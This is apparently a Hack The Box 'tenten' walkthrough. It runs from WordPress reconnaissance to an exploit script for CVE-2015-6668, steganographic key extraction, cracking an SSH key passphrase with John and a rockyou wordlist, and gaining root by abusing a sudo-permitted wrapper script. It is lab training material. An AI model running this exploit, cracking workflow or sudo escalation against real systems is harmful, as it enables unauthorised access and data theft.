---
title: "HTB tenten"
date: 2020-09-25 22:44:00 -0700
categories: [HTB, writeup]
tags: [writeup]
toc: true
---

## Introduction

HTB tenten is a linux-based box.

Author: ``ch4p``

Machine IP: ``10.10.10.10``

## Reconnaissance

### nmap

``nmap -sC -sV -o nmap.nmap 10.10.10.10``

Here is the output of the scan: 

```
kali@kali:~/Desktop/htb/tenten$ nmap -sC -sV -o nmap.nmap 10.10.10.10 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 23:31 EDT                                                                                                                                                    
Nmap scan report for 10.10.10.10                                                                                                                                                                                   
Host is up (0.080s latency).                                                                                                                                                                                       
Not shown: 998 filtered ports                                                                                                                                                                                      
PORT   STATE SERVICE VERSION                                                                                                                                                                                       
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)                                                                                                                                  
| ssh-hostkey:                                                                                                                                                                                                     
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)                                                                                                                                                     
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)                                                                                                                                                    
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.7.3
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Job Portal &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.68 seconds
```

SSH and a web server. Let's check out the web server first.

![site](/assets/htb-tenten/site.PNG)

The website is running Wordpress. Using the firefox extension Wappalyzer, I'm able to grab the version number being used.

![wapp](/assets/htb-tenten/wapp.PNG)

Since we know that wordpress is being used, we can use ``wpscan`` to get more information about various themes, vulnerabilites, etc. If I put the full scan in, it would be longer than the writeup so here are some of the interesting/important parts.

```
[i] Plugin(s) Identified:

[+] job-manager
 | Location: http://10.10.10.10/wp-content/plugins/job-manager/
 | Latest Version: 0.7.25 (up to date)
 | Last Updated: 2015-08-25T22:44:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Job Manager <= 0.7.25 -  Insecure Direct Object Reference (IDOR)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8167
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668
 |      - https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/
 |
 | Version: 7.2.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.10/wp-content/plugins/job-manager/readme.txt
```

```
[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.10.10/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://10.10.10.10/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
```
```
[i] User(s) Identified:

[+] takis
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.10.10/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668


I also ran a gobuster scan.

```
==========================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.10/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,pdf
[+] Timeout:        10s
===============================================================
2020/09/25 23:43:08 Starting gobuster
===============================================================
/.bashrc (Status: 200)
/.htaccess (Status: 403)
/.htaccess.pdf (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.pdf (Status: 403)
/.profile (Status: 200)
/index.php (Status: 301)
/license.txt (Status: 200)
/server-status (Status: 403)
/wp-admin (Status: 301)
/wp-config.php (Status: 200)
/wp-content (Status: 301)
/wp-includes (Status: 301)
/wp-login.php (Status: 200)
/wp-trackback.php (Status: 200)
```

I don't know what to do with any of this information yet, so I'm going to keep looking through the web server. When I click on job applications and apply for jobs, this is the url:

```
http://10.10.10.10/index.php/jobs/apply/8/
```

Interesting.. I tried changing the integer at the end and inspecting each of the pages. On 13, I found something interested. The title of the page is ``HackerAccessGranted``. This appeared in the Job Portal and there is a job portal plugin, so let's take a look at the plugin's vulns. Out of the three reference links listed, only one of them is still live: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668

```
The Job Manager plugin before 0.7.25 allows remote attackers to read arbitrary CV files via a brute force attack to the WordPress upload directory structure, related to an insecure direct object reference.
```

So it looks like we're going to be able to view and download some kind of file with the details we are given. The mitre link did not provide enough information for me to find anything notable, so I looked for a different source of information.

I found all the information I needed in one of the other reference links that had been taken down using the Wayback Machine: https://web.archive.org/web/20160601114653/https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/

```
The wordpress directory structure for the uploaded files is known as /wp-content/uploads/%year%/%month%/%filename%
```

I found this old exploit script from the person who found the vuln:

```
import requests

print """  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
"""  
website = raw_input('Enter a vulnerable website: ')  
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2017,2019):  
    for i in range(1,13):
        for extension in {'jpeg','png','jpg'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
```

```
kali@kali:~/Desktop/htb/tenten$ python exploit.py
  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://10.10.10.10
Enter a file name: HackerAccessGranted                                                                                                                    
[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```

Let's download that file: ``wget http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg``

It looks like a normal image, stegsolve gives nothing, nothing in the metadata/strings, nothing with binwalk etc.

But the infamous steghide with no password actually worked. I just did one of the HTB Stego Challenges where this was also the solution which is nice.

```
kali@kali:~/Desktop/htb/tenten$ steghide extract -sf HackerAccessGranted.jpg
Enter passphrase: 
wrote extracted data to "id_rsa".
```

We get this file, ``id_rsa``. Let's check the file type:

```
kali@kali:~/Desktop/htb/tenten$ file id_rsa
id_rsa: PEM RSA private key
```

`` PEM RSA private key ``. 

This is my first time dealing with an RSA key, but I think it's fairly obvious this will be used for SSH (remember the initial port scan). Cool, let's try to crack this. I looked for a way to do it in hashcat, but it looks like JohnTheRipper is the only way to go about it.

I found a forum thread with someone complaining about a tool called ``sshng2john``. It looks like this tool will let us decrypt ssh keys.

Downloaded it from here: https://raw.githubusercontent.com/stricture/hashstack-server-plugin-jtr/master/scrapers/sshng2john.py

``` kali@kali:~/Desktop/htb/tenten$ python sshng2john.py id_rsa.pem > john_rsa ```

```
kali@kali:~/Desktop/htb/tenten$ cat john_rsa
16
id_rsa.pem:$sshng$1$16$7265FC656C429769E4C1EEFC618E660C$1200$fc75dc501393dc98736e51fbb85f5587b7da6bbe971c876bfc2874a439c9ba78dd98b4bf95aab592e950dff445fd56b1b634f38ff57984111c2f919c1efddeb2b383952d2384c2f9de5029ae4a5ac1f6efc1b47e5f114826ecfbccb7ddfef0e8d4ab86ac2ad146c8a993269ee4a8aa942d77edb9962bd684ff87395f6c9f55338478e0dd5b4ac0a13cc6b9f5ad4e165f2b69f2d224c63e7743ecb31d9bfa393b902cf82843605369855d570e07c3cc78289ca302e22112ec993c1b3db43c9b2649d5826b317aa4812a848e0d42b9e477c9262aace4a5f5aa643cf7fa0e9fe3d1987fdeda3394d081375acb6a05aa85c758f84adc29b4b4c1aa2d9034d7ea0dbb05d2d07e77b7d146ec6a94df5c23ee7006581a5f1a8746c1e75875ee3394e04f55b36e95130a3a412bbff34288655170aea4e50b5d6f07e8ae1fba6cc8e6284e90bcc5db7ac66d434802f52259de5313274218f37f0741980eb12c358c3af1b8f5760d4218151d16de442b0d55329b4068c4ec0e7ff3254f1beb0b6c2f6c7ab00009e2b84a2d6fda1acff3df6aedce3bf0d5cd892a23df550d7fd8048c5dd7af2aa996d7b0cf6cfda30275583b4c9d60da0c4496957b53d9318a5fd135dc79500485a6f16c9663a7ec24d9e8de38c626ad4141f2575360a4d0b28df10ccd7328e85b56695a9b192b5ac7588c442d7df19d1c4645f65684ef4e5850c3be2b48f18f3041fe392164b17a7b49eff0083300a58640495c65ea835640afa9023e73e1685a052044afc6559857f292e878968ed3b27c5af56368597a3a5f415238f324b4da416cf3ead79f8cf9d49968e6da77d13f327bc17da48a96f927e1ea6407b9f45643b5b2c2dc79c7f18be6d69c63e62a8c32a94ea2b85dbcc3527d06da308275ab520b65aae6e6934c247fe974f2283b9283324fd29f65e811ee817ddb113de085834f17cbcbbe68d431f446b9b47fbec3e07bcd0b6a90d1d607900a5dd5d9386e571bef5162e5617507746bbb2805d864ab781c979f983dd7961af36b82dcef924f9401798da94fc064d83e88926b7ab8894b9e8d1292bdeff6be894f927b2f452d320754a9ffb7e7e700ef42ffc0894fd04d3853469a1a9b1c0e0d39f432fcf1dcef221c878384e57ddf715ad4125713335114f0119e378d2c57f783cb970731ccb57a15f45500a75b8ba9000ac8157942e223ec807cf8c82325749b592fe4757f6d826f55ab46b6690db8cb6e2bb34e1fc884ee4083c429cf9cf65ad275a81c3938c9de74465cf39e43e76bbe2b5dba3d15d35e2cd98447fec619d400464a5de7652eaf4f1f2095b6c324b56dd81b060c3f1bea6e14047ccfb8a9823e16a7d2e862a8aec5a11b883e7353378eb4a00a2ff9df9b32bcdb36dd3f132bbfb4ef1d4492584502e0ef502a20776a681fc96323c37a2d1fe64b9c19b2fdf4ba2154393a757aad5850efe2d129efaa95889dcdfa75f6520bf1489d6ec05f580cc1f57934b07e5cd4d413eaca68fe740cdd43489249fe6bbcca3c999eb47b0ee0e6f7c4a2e24a9c397f7e52455fab17e98ebc8504d7f62cb1730eed32ba8812170aeb8e52d3a91a22f1355448689bdb1a66b32d6092ca9b64e5f2613cb921b8af89628667f45340b9189814bdebc3eeaaa25f8aa2ace83c925e93a587472f0e484fbc0f3d72b132c83c1ead18a9fb1169cf
```

```
kali@kali:~/Desktop/htb/tenten$ sudo john john_rsa --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
superpassword    (id_rsa.pem)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:04 DONE (2020-09-26 00:44) 0.2150g/s 3084Kp/s 3084Kc/s 3084KC/sa6_123..*7¡Vamos!
Session completed
```

Looks like the pasword is ``superpassword``. 

So we have the private key file and the password. In order to make use of these files, we can use the ``-i`` tag to use this "identity file". Remember the username of ``takis`` from the initial wpscan.

I went through a lot of trouble when figuring out how to do this step, I ended up re-extracting the ``id_rsa`` file. 

First, you have to chmod to change permissions.

```
chmod 600 id_rsa
```

If you do not do this or add permissions that are too broad (I initially tried 777) it will not work. You have to use this number. Then use the command:

```
ali@kali:~/Desktop/htb/tenten$ ssh -i id_rsa takis@10.10.10.10
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
39 updates are security updates.


Last login: Fri May  5 23:05:36 2017
takis@tenten:~$ 
```

ayy we are in.

```
Last login: Fri May  5 23:05:36 2017
takis@tenten:~$ ls
user.txt
takis@tenten:~$ cat user.txt 
e5c7ed3b89e73049c04c432fc8686f31
takis@tenten:~$ 
```

## Priv Esc

Let's go for the normal ``sudo -l``.

```
takis@tenten:~$ sudo -l
Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin
```

Let's take a look at this.

```
takis@tenten:~$ cat /bin/fuckin
#!/bin/bash
$1 $2 $3 $4
```

So it's a script and it executes $1, $2, $3, and $4. Let's google what those mean in a script:

https://stackoverflow.com/questions/5163144/what-are-the-special-dollar-sign-shell-variables

```
$1, $2, $3, ... are the positional parameters.
```

Cool, so let's test this out.

```
takis@tenten:~$ /bin/fuckin echo 'bruh'
bruh
```

Looks like it can be used to execute commands! Let's try to use this to spawn a root shell.

```
takis@tenten:~$ sudo /bin/fuckin /bin/sh
# whoami
root
# 
```

LETS GO!! we got root. This is the easiest priv escalation I've ever done what can I say.









